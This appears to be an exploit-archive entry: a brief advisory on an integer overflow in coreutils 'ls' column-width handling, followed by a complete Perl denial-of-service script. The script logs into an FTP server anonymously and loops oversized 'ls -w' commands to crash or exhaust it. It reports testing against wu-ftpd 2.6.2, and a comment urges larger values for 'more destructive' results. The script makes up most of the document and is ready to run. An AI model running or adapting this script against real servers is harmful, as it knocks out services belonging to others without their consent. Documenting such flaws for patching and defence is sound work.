source: http://www.securityfocus.com/bid/8875/info

Coreutils 'ls' has been reported prone to an integer overflow vulnerability. The issue reportedly presents itself when handling width and column display command line arguments. It has been reported that excessive values passed as a width argument to 'ls' may cause an internal integer value to be misrepresented. Further arithmetic performed based off this misrepresented value may have unintentional results.

Additionally it has been reported that this vulnerability may be exploited in software that implements and invokes the vulnerable 'ls' utility to trigger a denial of service in the affected software. 

#!/usr/bin/perl

# DoS sploit for ls 
# tested against wu-ftpd 2.6.2

# coded by (c) druid 
# greets to viator

use Net::FTP;

(($target = $ARGV[0])&&($count = $ARGV[1])) || die "usage:$0 <target> <count>";
my $user = "anonymous";
my $pass = "halt\@xyu.com";
$cols=1000000;#you can increase this value for more destructive result ;)


print ":: Trying to connect to target system at: $target...\n"; $ftp = Net::FTP->new($target, Debug => 0, Port => 21) || die "could not 
connect: $!";
print "Connected!\n";
$ftp->login($user, $pass) || die "could not login: $!"; 
print "Logged in!\n";
$ftp->cwd("/");
while ($count)
{
$ftp->ls("-w $cols -C");
 $count--; 
}
print "Done!\n";
$ftp->quit;